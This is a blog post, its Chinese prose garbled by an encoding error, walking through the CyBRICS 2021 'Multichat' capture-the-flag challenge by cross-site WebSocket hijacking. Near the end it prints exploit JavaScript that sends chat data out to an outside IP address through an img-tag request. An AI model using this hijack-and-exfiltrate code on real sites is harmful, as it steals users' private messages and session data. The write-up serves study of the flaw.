

<!DOCTYPE html>
<html lang="en" color-mode=light>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>CyBRICS2021Multichat - Welcome to fallingblog</title>
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="google" content="notranslate" />
  
  <meta name="description" content="èµ›åšé‡‘ç –æ¯”èµ›çš„webé¢˜ï¼Œæ¯”èµ›æ—¶æ²¡åšå‡ºæ¥ï¼Œèµ›åçœ‹äº†Snd...">
  <meta name="author" content="Ibukifalling">
  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
  
    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
    <meta rel="msapplication-TileColor" content="#000000">
  

  
<link rel="stylesheet" href="/css/style.css">


  
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">

  

  
    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">

  

  
    
      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">

      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">

      
  

  <script>
    var CONFIG = window.CONFIG || {};
    var ZHAOO = window.ZHAOO || {};
    CONFIG = {
      isHome: false,
      fancybox: true,
      pjax: false,
      lazyload: {
        enable: true,
        only_post: 'false',
        loading: '[object Object]'
      },
      donate: {
        enable: true,
        alipay: '/images/myimg/alipay.jpg',
        wechat: '/images/myimg/wechat.png'
      },
      galleries: {
        enable: true
      },
      fab: {
        enable: true,
        always_show: false
      },
      carrier: {
        enable: true
      },
      daovoice: {
        enable: false
      },
      preview: {
        background: {
          default: '',
          api: ''
        },
        motto: {
          default: 'æˆ‘åœ¨å¼€äº†ç¯çš„åºŠå¤´ä¸‹ï¼Œæƒ³é—®é—®è‡ªå·±çš„å¿ƒå•Šã€‚',
          typing: true,
          api: 'https://v2.jinrishici.com/one.json',
          data_contents: '["data","content"]'
        },
      },
      qrcode: {
        enable: true,
        type: 'url',
        image: 'https://pic.izhaoo.com/weapp-code.jpg',
      },
      toc: {
        enable: true
      },
      scrollbar: {
        type: 'default'
      },
      notification: {
        enable: false,
        delay: 4500,
        list: '',
        page_white_list: '',
        page_black_list: ''
      },
      search: {
        enable: false,
        path: ''
      }
    }
  </script>

  

  

<meta name="generator" content="Hexo 5.4.0"></head>

<body class="lock-screen">
  <div class="loading"></div>
  
    


  <nav class="navbar">
    <div class="left">
      
        <i class="iconfont iconhome j-navbar-back-home"></i>
      
      
        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
      
      
        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
      
      
    </div>
    <div class="center">CyBRICS2021Multichat</div>
    <div class="right">
      <i class="iconfont iconmenu j-navbar-menu"></i>
    </div>
    
      <div id="qrcode-navbar"></div>
    
  </nav>

  
  

<nav class="menu">
  <div class="menu-container">
    <div class="menu-close">
      <i class="iconfont iconbaseline-close-px"></i>
    </div>
    <ul class="menu-content"><li class="menu-item">
        <a href="/ " class="underline "> é¦–é¡µ</a>
      </li><li class="menu-item">
        <a href="/galleries/ " class="underline "> æ‘„å½±</a>
      </li><li class="menu-item">
        <a href="/archives/ " class="underline "> å½’æ¡£</a>
      </li><li class="menu-item">
        <a href="/tags/ " class="underline "> æ ‡ç­¾</a>
      </li><li class="menu-item">
        <a href="/categories/ " class="underline "> åˆ†ç±»</a>
      </li><li class="menu-item">
        <a href="/about/ " class="underline "> å…³äº</a>
      </li></ul>
    
      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
    
  </div>
</nav>
  <main id="main">
  <div class="article-wrap">
    <div class="row container">
      <div class="col-xl-3"></div>
      <div class="col-xl-6"><article class="article">
  <div class="wrap">
    <section class="head">
  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
  <div class="head-mask">
    <h1 class="head-title">CyBRICS2021Multichat</h1>
    <div class="head-info">
      <span class="post-info-item"><i class="iconfont iconcalendar"></i>July 27, 2021</span>
      
      <span class="post-info-item"><i class="iconfont iconfont-size"></i>6615</span>
    </div>
  </div>
</section>
    <section class="main">
      <section class="content">
        <p>èµ›åšé‡‘ç –æ¯”èµ›çš„webé¢˜ï¼Œæ¯”èµ›æ—¶æ²¡åšå‡ºæ¥ï¼Œèµ›åçœ‹äº†Sndavå¤§ä½¬çš„expåï¼ˆåœ¨namanæç¤ºæˆ‘â€œä½ åº”è¯¥å…ˆé€šæœ¬åœ°â€œä¹‹ådeå‡ºäº†è‡ªå·±å†™çš„è„šæœ¬é‡Œè‡³å°‘ä¸‰ä¸ªbugï¼‰æˆåŠŸå¤ç°</p>
<p>æ€»ä½“æ¥è¯´æ„Ÿæ‚Ÿå¾ˆå¤šï¼Œå†™ä¸€ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹</p>
<h1 id="CyBRICS2021-Multichat"><a href="#CyBRICS2021-Multichat" class="headerlink" title="[CyBRICS2021]Multichat"></a>[CyBRICS2021]Multichat</h1><h2 id="æ€»è§ˆ"><a href="#æ€»è§ˆ" class="headerlink" title="æ€»è§ˆ"></a>æ€»è§ˆ</h2><p><img   class="lazyload" data-original="/images/CyBRICS2021Multichat/image-20210727171205422.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>æ¦‚è¦ï¼šä¸‹é¢çš„ç½‘å€æ˜¯ä¸€ä¸ªå¤šäººèŠå¤©å®¤ï¼ŒæŠ€æœ¯äººå‘˜å’Œç®¡ç†å‘˜æ˜¯ä¸€ä¸ªç§˜å¯†æˆ¿é—´çš„æˆå‘˜ï¼Œå½“æŠ€æœ¯äººå‘˜ç»™ç®¡ç†å‘˜å‘é€â€Hey, i forgot the flag. Can you remind me?â€æ—¶ï¼Œç®¡ç†å‘˜å°±ä¼šå‘Šè¯‰ä»–flagã€‚</p>
<p><img   class="lazyload" data-original="/images/CyBRICS2021Multichat/image-20210727172555485.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>èŠå¤©å®¤ç•Œé¢å¦‚å›¾ï¼Œå·¦ä¸Šè§’è¾“å…¥æˆ¿é—´å·åç‚¹å‡»connectå°±èƒ½åŠ å…¥èŠå¤©å®¤ã€‚</p>
<h2 id="å¯»æ‰¾æ€è·¯"><a href="#å¯»æ‰¾æ€è·¯" class="headerlink" title="å¯»æ‰¾æ€è·¯"></a>å¯»æ‰¾æ€è·¯</h2><p>åœ¨éƒ­å“¥çš„æç¤ºä¸‹æ„è¯†åˆ°è¿™ä¸ªèŠå¤©å®¤æ˜¯ç”±websocketå®ç°çš„</p>
<blockquote>
<p>WebSocketç®€ä»‹</p>
<p>â€‹    WebSocketæ˜¯ä¸€ç§ç½‘ç»œé€šä¿¡åè®®ï¼Œå®ƒçš„æœ€å¤§ç‰¹ç‚¹å°±æ˜¯ï¼ŒæœåŠ¡å™¨å¯ä»¥ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯ä¹Ÿå¯ä»¥ä¸»åŠ¨å‘æœåŠ¡å™¨å‘é€ä¿¡æ¯ï¼Œæ˜¯çœŸæ­£çš„åŒå‘å¹³ç­‰å¯¹è¯ï¼Œå±äº<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Push_technology">æœåŠ¡å™¨æ¨é€æŠ€æœ¯</a>çš„ä¸€ç§ã€‚</p>
</blockquote>
<p>ç„¶ååˆåœ¨è°·æ­Œä¸Šæ‰¾åˆ°äº†å…³äº<strong>è·¨ç«™WebSocketåŠ«æŒ</strong>çš„èµ„æ–™</p>
<blockquote>
<h2 id="What-is-cross-site-WebSocket-hijacking"><a href="#What-is-cross-site-WebSocket-hijacking" class="headerlink" title="What is cross-site WebSocket hijacking?"></a>What is cross-site WebSocket hijacking?</h2><p>Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">cross-site request forgery</a> (CSRF) vulnerability on a <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/websockets/what-are-websockets#how-are-websocket-connections-established">WebSocket handshake</a>. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/tokens">CSRF tokens</a> or other unpredictable values.</p>
<p>An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim userâ€™s session with the application.</p>
<p>The attackerâ€™s page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.</p>
</blockquote>
<p>ç„¶åæ³¨æ„åˆ°èŠå¤©å®¤å³ä¸Šè§’é‚£ä¸ªç”µè¯å›¾æ ‡æ˜¯å¯ä»¥ç‚¹çš„</p>
<p><img    class="lazyload" data-original="/images/CyBRICS2021Multichat/image-20210727175009234.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">THIS</span></p>
<p>ç‚¹å‡»ä¹‹åè·³è½¬åˆ°ä¸€ä¸ªå‘æŠ€æœ¯äººå‘˜å¯»æ±‚å¸®åŠ©çš„ç•Œé¢</p>
<p><img   class="lazyload" data-original="/images/CyBRICS2021Multichat/image-20210727175047961.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>çœ‹åˆ°å¯ä»¥å¡«å…¥URLï¼ŒçŒœæƒ³æœ‰å¯èƒ½æ˜¯è¿™ä¸ªurlä¼šè¢«æŠ€æœ¯äººå‘˜è®¿é—®</p>
<p>æ„è¯†åˆ°è¿™é¢˜å¾ˆå¯èƒ½å°±æ˜¯è·¨ç«™WebSocketåŠ«æŒï¼Œç„¶åæŠŠè¿™ä¸ªæƒ³æ³•å‘åˆ°äº†é£ä¹¦è¯é¢˜é‡Œé¢ã€‚</p>
<p>å—¯ï¼Œå‘å®Œä¹‹åå°±æ²¡æˆ‘ä»€ä¹ˆäº‹äº†ï¼Œå› ä¸ºæˆ‘åœ¨è¿™ä¸ªåœ°æ–¹è¢«ä¸€ä¸ªå¾ˆè ¢çš„ä¸œè¥¿å¡ä½äº†â€¦â€¦</p>
<p><img   class="lazyload" data-original="/images/CyBRICS2021Multichat/image-20210727184410335.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>æ¯”èµ›çš„æ—¶å€™ä¸€ç›´æ˜¾ç¤ºInvalid captchaéªŒè¯å¤±è´¥ï¼Œè¿™é¢˜å°±æ²¡ç»§ç»­å¾€ä¸‹åšäº†</p>
<p>èµ›åå¤ç°çš„æ—¶å€™ç ”ç©¶äº†åŠå¤©ï¼Œå‘ç°éœ€è¦ æŒ‚ ä»£ ç†ï¼Œå±…ç„¶æ˜¯è¦     æŒ‚    ä»£    ç†ï¼ï¼ï¼</p>
<p>ï¼ˆæˆ‘ä¸çŸ¥é“è¿™ä¸ªéªŒè¯åˆ°åº•æ˜¯æ€ä¹ˆæ•´çš„ï¼Œä½†æ˜¯ä¸æŒ‚ä»£ç†å°±ä¸€ç›´è¿‡ä¸äº†ï¼Œæ„Ÿè§‰åœ¨è¿™ç§åœ°æ–¹è¢«å¡ä½äº†å°±æŒºæ— è¯­çš„ï¼‰</p>
<h2 id="å®æ–½æ”»å‡»"><a href="#å®æ–½æ”»å‡»" class="headerlink" title="å®æ–½æ”»å‡»"></a>å®æ–½æ”»å‡»</h2><p>è§£å†³äº†ä»¤äººğŸ˜…çš„éªŒè¯é—®é¢˜ï¼Œä¸‹é¢æˆ‘ä»¬æ¥èŠä¸€ä¸‹Cross-site WebSocket hajackingçš„åŸç†å’Œå®æ–½</p>
<p>å…ˆçœ‹ä»¥ä¸‹è¿™ä¸ªWebSocketç½‘é¡µè„šæœ¬çš„ç®€å•ä¾‹å­</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> ws = <span class="hljs-keyword">new</span> WebSocket(<span class="hljs-string">&quot;wss://xxxxxxxxxxxxxx&quot;</span>);<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªWebSocketè¿æ¥</span><br><br>ws.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>) </span>&#123; <span class="hljs-comment">//å»ºç«‹è¿æ¥æˆåŠŸåçš„å›è°ƒå‡½æ•°</span><br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Connection open ...&quot;</span>); <br>  ws.send(<span class="hljs-string">&quot;Hello WebSockets!&quot;</span>);<br>&#125;;<br><br>ws.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>) </span>&#123;<span class="hljs-comment">//æ”¶åˆ°æœåŠ¡å™¨æ•°æ®åçš„å›è°ƒå‡½æ•°</span><br>  <span class="hljs-built_in">console</span>.log( <span class="hljs-string">&quot;Received Message: &quot;</span> + evt.data);<br>  ws.close();<br>&#125;;<br><br>ws.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>) </span>&#123;<span class="hljs-comment">//è¿æ¥å…³é—­åçš„å›è°ƒå‡½æ•°</span><br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Connection closed.&quot;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>å¾ˆå®¹æ˜“å°±èƒ½çœ‹æ˜ç™½ï¼Œè¿æ¥å»ºç«‹åé€šè¿‡onmessageç­‰å‡ ä¸ªå‡½æ•°æ¥è¿›è¡Œæ§åˆ¶ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å†çœ‹æœ¬é¢˜æ‰€ä½¿ç”¨çš„è„šæœ¬</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-keyword">var</span> conn;</span><br><span class="javascript">    <span class="hljs-keyword">var</span> sended_message = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandomInt</span>(<span class="hljs-params">min, max</span>) </span>&#123;</span><br><span class="javascript">        min = <span class="hljs-built_in">Math</span>.ceil(min);</span><br><span class="javascript">        max = <span class="hljs-built_in">Math</span>.floor(max);</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * (max - min) + min); <span class="hljs-comment">//The maximum is exclusive and the minimum is inclusive</span></span><br><span class="javascript">    &#125;</span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">item</span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">var</span> escaped = $(<span class="hljs-string">&quot;&lt;div&gt;&quot;</span>).text(item).html();</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (item === sended_message) &#123;</span><br><span class="javascript">            log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-right pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&lt;div class=&quot;font-weight-bold mb-1&quot;&gt;You&lt;/div&gt;&#x27;</span> +</span><br><span class="javascript">                escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="javascript">            sended_message = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">            log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-left pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&#x27;</span> +</span><br><span class="javascript">                escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="javascript">        &#125;</span><br><span class="javascript">        log.scrollTop = log.scrollHeight;</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> room = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value;</span><br><span class="javascript">        <span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&#x27;room=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(room);</span><br><span class="javascript">        $(<span class="hljs-string">&quot;form input&quot;</span>).prop( <span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">false</span> );</span><br><span class="javascript">        $(<span class="hljs-string">&quot;#room&quot;</span>).hide();</span><br><span class="javascript">        $(<span class="hljs-string">&quot;#room&quot;</span>).parent().children().first().text(<span class="hljs-string">&quot;Room &quot;</span> + room);</span><br><span class="javascript"></span><br><span class="javascript">        $(<span class="hljs-string">&quot;#connectButton&quot;</span>).hide();</span><br><span class="javascript"></span><br><span class="javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>[<span class="hljs-string">&quot;WebSocket&quot;</span>]) &#123;</span><br><span class="javascript">            conn = <span class="hljs-keyword">new</span> WebSocket(<span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);</span><br><span class="javascript">            conn.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;</span><br><span class="javascript">                <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="javascript">                <span class="hljs-keyword">if</span> (evt.code === <span class="hljs-number">1003</span>) &#123;</span><br><span class="javascript">                    item = <span class="hljs-string">`Status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;</span><br><span class="javascript">                &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">                    item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;</span><br><span class="javascript">                &#125;</span><br><span class="javascript">                appendLog(item);</span><br><span class="javascript">            &#125;;</span><br><span class="javascript">            conn.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;</span><br><span class="javascript">                appendLog(<span class="hljs-string">&quot;Connected&quot;</span>);</span><br><span class="javascript">            &#125;;</span><br><span class="javascript">            conn.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;</span><br><span class="javascript">                appendLog(evt.data);</span><br><span class="javascript">            &#125;;</span><br><span class="javascript">        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">            appendLog(<span class="hljs-string">&quot;Your browser does not support WebSockets.&quot;</span>);</span><br><span class="javascript">        &#125;</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">var</span> room = getRandomInt(<span class="hljs-number">1000</span>, <span class="hljs-number">9999999999</span>);</span><br><span class="javascript">        <span class="hljs-keyword">var</span> msg = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;msg&quot;</span>);</span><br><span class="javascript">        <span class="hljs-keyword">var</span> log = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;log&quot;</span>);</span><br><span class="javascript"></span><br><span class="javascript">        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;form&quot;</span>).onsubmit = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-keyword">if</span> (!conn) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="javascript">            &#125;</span><br><span class="javascript">            <span class="hljs-keyword">if</span> (!msg.value) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="javascript">            &#125;</span><br><span class="javascript">            conn.send(msg.value);</span><br><span class="javascript">            sended_message = msg.value;</span><br><span class="javascript">            msg.value = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="javascript">        &#125;;</span><br><span class="javascript"></span><br><span class="javascript">        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value = room;</span><br><span class="javascript">    &#125;;</span><br></code></pre></td></tr></table></figure>

<p>å¿½ç•¥ä¸€äº›ä¸é‡è¦çš„åœ°æ–¹ï¼Œè¿™æ®µä»£ç çš„ä¸»è¦é€»è¾‘å°±æ˜¯ï¼šå»ºç«‹wsè¿æ¥ï¼Œç„¶åä½¿ç”¨appendLogå‡½æ•°å°†æ¥å—åˆ°çš„ä¿¡æ¯è¾“å‡ºåˆ°é¡µé¢ä¸Š</p>
<p>æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™ä¸€æ®µä»£ç ï¼Œæ”¾åœ¨æˆ‘ä»¬çš„åŠ«æŒé¡µé¢ä¸Šï¼Œæ¥è¿›è¡Œè·¨ç«™WebSocketåŠ«æŒ</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-keyword">var</span> conn;</span><br><span class="javascript">    </span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">item</span>)</span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.write(<span class="hljs-string">`&lt;img src=http://120.53.107.60/cookiegeter.php?cookie=<span class="hljs-subst">$&#123;<span class="hljs-built_in">escape</span>(item)&#125;</span>&lt;/img&gt;`</span>)<span class="hljs-comment">//ç®€å•çš„xss</span></span><br><span class="javascript">    &#125;</span><br><span class="javascript">    </span><br><span class="javascript">    conn = <span class="hljs-keyword">new</span> WebSocket(<span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);</span><br><span class="javascript">    conn.onclose=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>)</span>&#123;</span><br><span class="javascript">        appendLog(<span class="hljs-string">&quot;Connection closed&quot;</span>)</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    conn.onopen=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>)</span>&#123;</span><br><span class="javascript">        appendLog(<span class="hljs-string">&quot;Success!&quot;</span>);</span><br><span class="javascript">        conn.send(<span class="hljs-string">&quot;Hey, i forgot the flag. Can you remind me?&quot;</span>)</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    conn.onmessage=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>)</span>&#123;</span><br><span class="javascript">        appendLog(evt.data)</span><br><span class="javascript">    &#125;;</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œé€šè¿‡æ”¹å†™appendLogå‡½æ•°å’Œonopenå‡½æ•°ï¼Œå½“WebSocketè¿æ¥å»ºç«‹æ—¶ä¼šè‡ªåŠ¨å‘æœåŠ¡å™¨å‘é€æš—å·â€Hey, i forgot the flag. Can you remind me?â€ï¼Œå¹¶ä¸”æ¥å—åˆ°ä¿¡æ¯æ—¶ä¼šå†™å…¥æŒ‡å®šçš„åœ°å€ä¸­</p>
<p><img   class="lazyload" data-original="/images/CyBRICS2021Multichat/image-20210727203347026.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>ç„¶åæŠŠæˆ‘ä»¬æ•´å¥½çš„åŠ«æŒç½‘å€è¾“è¿›URLæ é‡Œï¼Œç‚¹å‡»Sendï¼ˆè®°å¾—æŒ‚æ¢¯å­ï¼‰</p>
<p><img   class="lazyload" data-original="/images/CyBRICS2021Multichat/image-20210727204421875.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>cybrics{Pwn3d_CR055_51t3_W3850CK3t_h1jACK1n9}</p>
<h1 id="æ„Ÿæƒ³å’Œæ€»ç»“"><a href="#æ„Ÿæƒ³å’Œæ€»ç»“" class="headerlink" title="æ„Ÿæƒ³å’Œæ€»ç»“"></a>æ„Ÿæƒ³å’Œæ€»ç»“</h1><p>å‚åŠ å›½é™…æ¯”èµ›çš„æ—¶å€™æ¢¯å­çœŸçš„çœŸçš„å¾ˆé‡è¦ï¼(ä¸ç®¡æ˜¯é€šè¿‡googleè¿›è¡Œä¿¡æ¯æœé›†è¿˜æ˜¯ä¸€äº›å› ä¸ºç½‘ç»œé—®é¢˜å¯¼è‡´çš„æäººå¿ƒæ€çš„é—®é¢˜)</p>
